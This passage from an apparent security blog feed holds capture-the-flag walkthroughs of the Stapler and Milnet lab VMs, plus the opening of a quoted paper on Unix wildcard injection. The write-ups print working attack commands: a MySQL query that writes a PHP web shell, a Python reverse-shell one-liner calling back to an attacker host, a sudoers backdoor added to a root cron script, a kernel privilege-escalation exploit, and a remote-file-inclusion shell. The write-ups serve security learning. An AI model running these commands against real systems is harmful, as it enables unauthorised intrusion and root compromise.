top
kill -9 3747
exit
</code></p>

<p>Inside we have JKanode and peter&rsquo;s passwords! I SSH'ed as peter and checked the sudo rights:</p>

<p>```
red% whoami
peter
red% sudo -l</p>

<p>We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:</p>

<pre><code>#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.
</code></pre>

<p>[sudo] password for peter:
Matching Defaults entries for peter on red:</p>

<pre><code>lecture=always, env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User peter may run the following commands on red:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>User peter has unlimited access on the machine! We can become root now:</p>

<p>```
red% sudo su
➜  peter ls /root
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  peter cat /root/flag.txt
<del>&lt;(Congratulations)></del></p>

<pre><code>                      .-'''''-.
                      |'-----'|
                      |-.....-|
                      |       |
                      |       |
     _,._             |       |
__.o`   o`"-.         |       |
</code></pre>

<p> .-O o <code>"-.o   O )_,._    |       |
( o   O  o )--.-"</code>O   o"&ndash;.<code>'-----'</code>
 &lsquo;&mdash;&mdash;&mdash;&mdash;&rsquo;  (   o  O    o)</p>

<pre><code>          `----------`
</code></pre>

<p>b6b545dc11b7a270f4bad23432190c75162c4a2b</p>

<p>```</p>

<h2>Web server on port 12380</h2>

<p>We&rsquo;ve accomplished the objective, but this is not over! Remember, there are multiple ways of getting shells.</p>

<p><img class="center" src="/images/pentest/stapler/stapler-site.png" title="&lsquo;stapler&rsquo; &lsquo;webpage&rsquo;" ></p>

<p>A hastily built website and left unfinished is bound to have something..maybe in the source code?</p>

<p>```</p>

<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->


<!--    Change the image source '/images/default.jpg' with your favourite image.     -->


<p>```</p>

<p>Hmm, let&rsquo;s probe further:</p>

<p>```
nikto -h 192.168.217.141:12380</p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.217.141</li>
<li>Target Hostname:    192.168.217.141

<ul>
<li>Target Port:        12380</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#112;&#x61;&#x6d;&#x40;&#x72;&#x65;&#x64;&#46;&#108;&#x6f;&#x63;&#x61;&#108;&#104;&#111;&#115;&#x74;">&#112;&#x61;&#x6d;&#64;&#x72;&#x65;&#100;&#x2e;&#108;&#x6f;&#99;&#97;&#108;&#x68;&#x6f;&#x73;&#x74;</a>
                 Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                 Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#112;&#97;&#x6d;&#64;&#114;&#x65;&#x64;&#46;&#108;&#111;&#99;&#x61;&#x6c;&#104;&#111;&#115;&#x74;">&#112;&#97;&#109;&#x40;&#x72;&#x65;&#100;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;&#104;&#x6f;&#x73;&#x74;</a>

<ul>
<li>Start Time:         2018-06-01 06:46:45 (GMT-4)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/2.4.18 (Ubuntu)</li>
<li>Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>Uncommon header &lsquo;dave&rsquo; found, with contents: Soemthing doesn&rsquo;t look right here</li>
<li>The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>Entry &lsquo;/admin112233/&rsquo; in robots.txt returned a non-forbidden or redirect HTTP code (200)</li>
<li>Entry &lsquo;/blogblog/&rsquo; in robots.txt returned a non-forbidden or redirect HTTP code (200)</li>
<li>&ldquo;robots.txt&rdquo; contains 2 entries which should be manually viewed.</li>
<li>Hostname &lsquo;192.168.217.141&rsquo; does not match certificate&rsquo;s names: Red.Initech</li>
<li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</li>
<li>Uncommon header &lsquo;x-ob_mode&rsquo; found, with contents: 1</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>/phpmyadmin/: phpMyAdmin directory found
```</li>
</ul>


<p>So this site uses the database and we have robots.txt entries. However, I kept getting redirected to the webpage when trying anything else. Then I realized that I haven&rsquo;t tried browsing the site over SSL, so I did that and found myself looking at a blank page with the text <code>Internal Index Page!</code>. This time I was able to look at robots.txt and visit the entries:</p>

<p><img class="center" src="/images/pentest/stapler/beef.jpg" title="&lsquo;admin&rsquo; &lsquo;admin&rsquo;" ></p>

<p>Ok, a troll. The other entry proved more interesting, because it took me to a Wordpress blog:</p>

<p><img class="center" src="/images/pentest/stapler/initech.png" title="&lsquo;initech&rsquo; &lsquo;initech blog&rsquo;" ></p>

<p>The blog entries mention new plugins and themes..and this being a Wordpress installation, it&rsquo;s time to bring wpscan on the scene!</p>

<p>```
wpscan &mdash;disable-tls-checks &mdash;url <a href="https://192.168.217.141:12380/blogblog/">https://192.168.217.141:12380/blogblog/</a></p>

<hr />

<pre><code>    __          _______   _____                  
    \ \        / /  __ \ / ____|                 
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team 
                   Version 2.9.3
      Sponsored by Sucuri - https://sucuri.net
</code></pre>

<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>

<hr />

<p>[+] URL: <a href="https://192.168.217.141:12380/blogblog/">https://192.168.217.141:12380/blogblog/</a>
[+] Started: Fri Jun  1 07:28:02 2018</p>

<p>[!] The WordPress &lsquo;<a href="https://192.168.217.141:12380/blogblog/readme.html">https://192.168.217.141:12380/blogblog/readme.html</a>&rsquo; file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn&rsquo;t look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: <a href="https://192.168.217.141:12380/blogblog/wp-login.php?action=register">https://192.168.217.141:12380/blogblog/wp-login.php?action=register</a>
[+] XML-RPC Interface available under: <a href="https://192.168.217.141:12380/blogblog/xmlrpc.php">https://192.168.217.141:12380/blogblog/xmlrpc.php</a>
[!] Upload directory has directory listing enabled: <a href="https://192.168.217.141:12380/blogblog/wp-content/uploads/">https://192.168.217.141:12380/blogblog/wp-content/uploads/</a>
[!] Includes directory has directory listing enabled: <a href="https://192.168.217.141:12380/blogblog/wp-includes/">https://192.168.217.141:12380/blogblog/wp-includes/</a></p>

<p>[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from readme, links opml, stylesheets numbers, advanced fingerprinting, meta generator
[!] 54 vulnerabilities identified from the version number
```</p>

<p>Lots of XSS and other vulnerabilities, but I didn&rsquo;t notice something that I could use immediately, like an arbitrary file upload or code execution. I went ahead and enumerated the users:</p>

<p>```
wpscan &mdash;disable-tls-checks &mdash;url <a href="https://192.168.217.141:12380/blogblog/">https://192.168.217.141:12380/blogblog/</a> &mdash;enumerate u
[+] Enumerating usernames &hellip;
[+] Identified the following 10 user/s:</p>

<pre><code>+----+---------+-----------------+
| Id | Login   | Name            |
+----+---------+-----------------+
| 1  | john    | John Smith      |
| 2  | elly    | Elly Jones      |
| 3  | peter   | Peter Parker    |
| 4  | barry   | Barry Atkins    |
| 5  | heather | Heather Neville |
| 6  | garry   | garry           |
| 7  | harry   | harry           |
| 8  | scott   | scott           |
| 9  | kathy   | kathy           |
| 10 | tim     | tim             |
+----+---------+-----------------+
</code></pre>

<p>```</p>

<p>Next I enumerated all the plugins in the hope of finding an exploitable vulnerability:</p>

<p>```
wpscan &mdash;disable-tls-checks &mdash;url <a href="https://192.168.217.141:12380/blogblog/">https://192.168.217.141:12380/blogblog/</a> &mdash;enumerate ap
[+] Enumerating all plugins (may take a while and use a lot of system resources) &hellip;</p>

<p>   Time: 00:04:40 &lt;=====================> (74652 / 74652) 100.00% Time: 00:04:40</p>

<p>[+] We found 4 plugins:</p>

<p>[+] Name: advanced-video-embed-embed-videos-or-playlists &ndash; v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2015-10-14T13:52:00.000Z
 |  Location: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/">https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/</a>
 |  Readme: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt">https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt</a>
[!] Directory listing is enabled: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/">https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/</a></p>

<p>[+] Name: akismet
 |  Latest version: 4.0.7
 |  Last updated: 2018-05-28T16:19:00.000Z
 |  Location: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/akismet/">https://192.168.217.141:12380/blogblog/wp-content/plugins/akismet/</a></p>

<p>[!] We could not determine a version so all vulnerabilities are printed out</p>

<p>[!] Title: Akismet 2.5.0-3.1.4 &ndash; Unauthenticated Stored Cross-Site Scripting (XSS)</p>

<pre><code>Reference: https://wpvulndb.com/vulnerabilities/8215
Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
</code></pre>

<p>[i] Fixed in: 3.1.5</p>

<p>[+] Name: shortcode-ui &ndash; v0.6.2
 |  Last updated: 2017-09-12T20:55:00.000Z
 |  Location: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/">https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/</a>
 |  Readme: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt">https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt</a>
[!] The version is out of date, the latest version is 0.7.3
[!] Directory listing is enabled: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/">https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/</a></p>

<p>[+] Name: two-factor
 |  Latest version: 0.1-dev-20180225
 |  Last updated: 2018-02-25T10:55:00.000Z
 |  Location: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/">https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/</a>
 |  Readme: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/readme.txt">https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/readme.txt</a>
[!] Directory listing is enabled: <a href="https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/">https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/</a>
```</p>

<p>Still not much. The expected way is to upload a reverse shell, but I didn&rsquo;t have credentials for the WP users and I tried bruteforcing but it was very slow. I remembered that I have the MySQL credentials from earlier:</p>

<p>```
root@kali:~# mysql -u root -h 192.168.217.141 wordpress -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 21183
Server version: 5.7.12-0ubuntu1 (Ubuntu)</p>

<p>Copyright &copy; 2000, 2017, Oracle, MariaDB Corporation Ab and others.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>MySQL [wordpress]>
```</p>

<p>I logged in to the DB and grabbed the password hashes:</p>

<p>```
MySQL [wordpress]> show tables;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| Tables_in_wordpress   |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>

<p>MySQL [wordpress]> SELECT user_login, user_pass FROM wp_users;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| user_login | user_pass                          |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
```</p>

<p>I tried cracking them with john but it took so long so I aborted it. Instead, I leveraged the fact that MySQL was running as root to write a rudimentary shell on the filesystem:</p>

<p><code>
MySQL [wordpress]&gt; Select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
Query OK, 1 row affected (0.04 sec)
</code></p>

<p>I tested the shell:</p>

<p><code>
https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami
www-data
</code></p>

<p>Then I used one of PentestMonkey&rsquo;s awesome one-liners to upgrade the shell, after setting up a listener:</p>

<p>```
<a href="https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=python">https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=python</a> -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;192.168.217.132&rdquo;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;</p>

<p>nc -vnlp 8888
listening on [any] 8888 &hellip;
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.141] 39846
/bin/sh: 0: can&rsquo;t access tty; job control turned off
$ python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```</p>

<p>A bit convoluted and relying on the enumeration / access from previous attempts, but I got another low privileged shell. I proceeded to do more enumeration in order to find a different way of elevating privileges. One of the things I did was search for files owned by root and writeable by everyone:</p>

<p><code>
find / -type f -user root -perm /o=w 2&gt;/dev/null
</code></p>

<p>I scrolled through the output until I found something interesting:</p>

<p>```
/usr/local/sbin/cron-logrotate.sh
www-data@red:/$ cat /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh</p>

<h1>Simon, you really need to-do something about this</h1>

<p>```</p>

<p>A cronjob run by root that we can write to! I added the following line that adds www-data to sudoers:</p>

<p><code>
echo "echo 'www-data  ALL=NOPASSWD: ALL' &gt;&gt; /etc/sudoers" &gt;&gt; /usr/local/sbin/cron-logrotate.sh
</code></p>

<p>Waited a bit and then:</p>

<p>```
$ sudo su</p>

<p>id
uid=0(root) gid=0(root) groups=0(root)
```</p>

<p>Lastly, we can get root just by using an exploit. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck.py</a> against the kernel version:</p>

<p>```
python linux_privcheck.py
Kernel version is 4.4.0-21-generic</p>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: BPF Privilege Escalation
CVE: CVE-2016-4557
Source code: <a href="https://www.exploit-db.com/exploits/39772/">https://www.exploit-db.com/exploits/39772/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: Netfilter target_offset Out-of-Bounds Privilege Escalation
CVE: N/A
Source code: <a href="https://www.exploit-db.com/exploits/40049/">https://www.exploit-db.com/exploits/40049/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: AF_PACKET Race Condition Privilege Escalation
CVE: CVE-2016-8655
Source code: <a href="https://www.exploit-db.com/exploits/40871/">https://www.exploit-db.com/exploits/40871/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: DCCP Double-Free Privilege Escalation
CVE: CVE-2017-6074
Source code: <a href="https://www.exploit-db.com/exploits/41458/">https://www.exploit-db.com/exploits/41458/</a></p>

<h6>#</h6>

<p>```</p>

<p>I used the first exploit, downloaded the files to my machine, and then uploaded them to the Stapler box by using the TFTP that I&rsquo;ve identified previously:</p>

<p><code>
tftp 192.168.217.141
tftp&gt; put compile.sh
Sent 160 bytes in 0.1 seconds
tftp&gt; put doubleput.c
Sent 4330 bytes in 0.0 seconds
tftp&gt; put hello.c
Sent 2272 bytes in 0.1 seconds
tftp&gt; put suidhelper.c
Sent 267 bytes in 0.0 seconds
</code></p>

<p>On my shell, I looked around and saw that the files were uploaded to the <code>/home/www</code> directory. I copied them to /tmp, compiled and ran the exploit:</p>

<p>```
$ ./compile.sh
doubleput.c: In function &lsquo;make_setuid&rsquo;:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</p>

<pre><code>.insns = (__aligned_u64) insns,
         ^
</code></pre>

<p>doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</p>

<pre><code>.license = (__aligned_u64)""
</code></pre>

<p>$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you&rsquo;ll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell&hellip;
we have root privs now&hellip;
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```</p>

<p>Getting root, a 3rd time! Thanks g0tmi1k for an awesome boot2root!</p>

<p>```</p>

<hr />

<p>/ Q: How does a hacker fix a function     \
| which                                   |
|                                         |
| doesn&rsquo;t work for all of the elements in |
\ its domain? A: He changes the domain.   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hacking the Milnet]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/"/>
    <updated>2018-05-13T06:55:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is a story-based VM inspired by a book! Let&rsquo;s jump straight in!</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (EdDSA)
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</code></p>

<p><img class="center" src="/images/pentest/milnet/milnet.jpg" title="&lsquo;milnet&rsquo; &lsquo;milnet&rsquo;" ></p>

<p>Nothing much on this site, some German text and a credits page. I ran Nikto on it with no significant finds. The site is running lighttpd/1.4.35 and it has an info.php page displaying phpinfo() output. There is also a line mentioning a RFI vulnerability for the info.php page, but I wasn&rsquo;t able to exploit that.</p>

<p>I ran dirb next, with no further luck. So I looked more closely at the phpinfo page. The allow_url_include directive is on, so RFI should definitely be possible somewhere, but I couldn&rsquo;t find extra pages. I tried OWASP ZAP next, and it helped with finding the vulnerable entry point:</p>

<p><img class="center" src="/images/pentest/milnet/zap.jpg" title="&lsquo;owasp zap rfi&rsquo; &lsquo;owasp zap rfi&rsquo;" ></p>

<p>I used Burp to craft a request directly to the content.php page, by trying to direct the route parameter to a page on my machine where the Python web server would serve a reverse shell, but it didn&rsquo;t work, so I took a step back to see how the website is using the route parameter. I just navigated on it with Burp on and observed the request:</p>

<p>```
POST /content.php HTTP/1.1
Host: 192.168.217.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <a href="http://192.168.217.140/nav.php">http://192.168.217.140/nav.php</a>
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10</p>

<p>route=bomb
```</p>

<p>So I intercepted this and changed route to point to <a href="http://192.168.217.132:8000/shell.php.">http://192.168.217.132:8000/shell.php.</a> This is my attacking machine where I was serving the shell on port 8000 and waiting for it on port 8888. This time I did get an incoming request:</p>

<p><code>
python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.217.140 - - [13/May/2018 08:16:54] code 404, message File not found
192.168.217.140 - - [13/May/2018 08:16:54] "GET /shell.php.php HTTP/1.0" 404 -
</code></p>

<p>An extra .php extension is appended to the request. So I changed the RFI to:</p>

<p><code>
route=http://192.168.217.132:8000/shell
</code></p>

<p>And this time things went smoothly:</p>

<p><code>
192.168.217.140 - - [13/May/2018 08:29:41] "GET /shell.php HTTP/1.0" 200 -
</code></p>

<p>I have a shell:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.140] 57412
Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 14:29:41 up  1:38,  0 users,  load average: 0.13, 0.07, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
</code></p>

<p>I proceeded with some enumeration:</p>

<p><code>
$ ls /home
langman
$ ls /home/langman
SDINET
</code></p>

<p>There are lots of text files in here:</p>

<p><code>
$ ls
DCA_Circular.310-P115-1
DefenseCode_Unix_WildCards_Gone_Wild.txt
FUN18.TXT
compserv.txt
fips-index.
fips_500_166.txt
fips_500_169.txt
fips_500_170.txt
fips_500_171.txt
pentagon.txt
sec-8901.txt
sec-8902.txt
sec-9540.txt
sec-9720.txt
</code></p>

<p>These are various army-related documents which you can read at your own leisure. More interesting is the DefenseCode_Unix_WildCards_Gone_Wild.txt document, which lists different code execution techniques by exploiting Unix wildcards. Because this was such an interesting read, I&rsquo;ve included it here:</p>

<p>```</p>

<h1>Back To The Future: Unix Wildcards Gone Wild</h1>

<ul>
<li>Leon Juranic <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x6c;&#x65;&#111;&#110;&#x40;&#100;&#x65;&#x66;&#x65;&#x6e;&#115;&#101;&#x63;&#x6f;&#100;&#x65;&#46;&#99;&#111;&#x6d;">&#108;&#x65;&#x6f;&#x6e;&#64;&#100;&#x65;&#102;&#101;&#x6e;&#x73;&#x65;&#99;&#111;&#x64;&#x65;&#46;&#x63;&#111;&#x6d;</a></li>
<li>Creation Date: 04/20/2013</li>
<li>Release Date: 06/25/2014</li>
</ul>


<p>Table Of Content:</p>

<p>===[ 1. Introduction
===[ 2. Unix Wildcards For Dummies
===[ 3. Wildcard Wilderness
===[ 4. Something more useful&hellip;</p>

<pre><code>  4.1 Chown file reference trick (file owner hijacking)
  4.2 Chmod file reference trick
  4.3 Tar arbitrary command execution 
  4.4 Rsync arbitrary command execution
</code></pre>

<p>===[ 5. Conclusion</p>

<p>===[ 1. Introduction</p>

<p>First of all, this article has nothing to do with modern hacking
techniques like ASLR bypass, ROP exploits, 0day remote kernel exploits or Chrome&rsquo;s
Chain-14-Different-Bugs-To-Get-There&hellip;
Nope, nothing of the above. This article will cover one interesting
old-school Unix hacking technique, that will still work nowadays in 2013.
Hacking technique of which (to my suprise) even many security-related people haven&rsquo;t heard of.
That is probably because nobody ever really talked about it before.
Why I decided to write on this subject is because, to me personally, it&rsquo;s pretty funny
to see what can be done with simple Unix wildcard poisoning tricks.
So, from this article, what you can expect is collection of neat *nix hacking
tricks that as far as I know somehow didn&rsquo;t emerge earlier.
If you wonder how basic Unix tools like &lsquo;tar&rsquo; or &lsquo;chown&rsquo; can lead to
full system compromise, keep on reading.
Ladies and gentleman; take your seats, fasten your belts and hold on tight
&ndash; cause we&rsquo;re going straight back to the 80&rsquo;s, right to the Unix shell hacking&hellip;
(Is this bad-hair-rock/groovy disco music playing in the background? I think sooo&hellip;)</p>

<p>===[ 2. Unix Wildcards For Dummies</p>

<p>If you already know what Unix wildcards are, and how (and why) are they
used in shell scripting, you should skip this part.
However, we will include Wildcard definition here just for the sake of
consistency and for potential newcomers.
Wildcard is a character, or set of characters that can be used as a
replacement for some range/class of characters. Wildcards are interpreted
by shell before any other action is taken.</p>

<p>Some Shell Wildcards:</p>

<pre><code>*     An asterisk matches any number of characters
      in a filename, including none.
?     The question mark matches any single
      character.
[ ]   Brackets enclose a set of characters, any
      one of which may match a single character
      at that position.
-     A hyphen used within [ ] denotes a range of
      characters.
~     A tilde at the beginning of a word expands
      to the name of your home directory.  If you
      append another user's login name to the
      character, it refers to that user's home
      directory.
</code></pre>

<p>Basic example of wildcards usage:</p>

<h1>ls *.php</h1>

<ul>
<li>List all files with PHP extension</li>
</ul>


<h1>rm *.gz</h1>

<ul>
<li>Delete all GZIP files</li>
</ul>


<h1>cat backup*</h1>

<ul>
<li>Show content of all files which name is beginning with &lsquo;backup&rsquo; string</li>
</ul>


<h1>ls test?</h1>

<ul>
<li>List all files whose name is beginning with string &lsquo;test&rsquo; and has exactly
one additional character</li>
</ul>


<p>===[ 3. Wildcard Wilderness</p>

<p>Wildcards as their name states, are &ldquo;wild&rdquo; by their nature, but moreover,
in some cases, wildcards can go berserk.
During the initial phase of playing with this interesting wildcard tricks,
I&rsquo;ve talked with dozen old-school Unix admins and security people,
just to find out how many of them knows about wildcard tricks, and
potential danger that they pose.
To my suprise, only two of 20 people stated that they know it&rsquo;s not
wise to use wildcard, particulary in &lsquo;rm&rsquo; command, because someone
could abuse it with &ldquo;argument-like-filename&rdquo;. One of them said that he
heard of that years ago on some basic Linux admin course. Funny.</p>

<p>Simple trick behind this technique is that when using shell wildcards,
especially asterisk (*), Unix shell will interpret files beginning with hyphen
(&ndash;) character as command line arguments to executed command/program.
That leaves space for variation of classic channeling attack.
Channeling problem will arise when different kind of information channels
are combined into single channel. Practical case in form of particulary this technique
is combining arguments and filenames, as different &ldquo;channels&rdquo; into single,
because of using shell wildcards.</p>

<p>Let&rsquo;s check one very basic wildcard argument injection example.</p>

<p>[root@defensecode public]# ls -al
total 20
drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
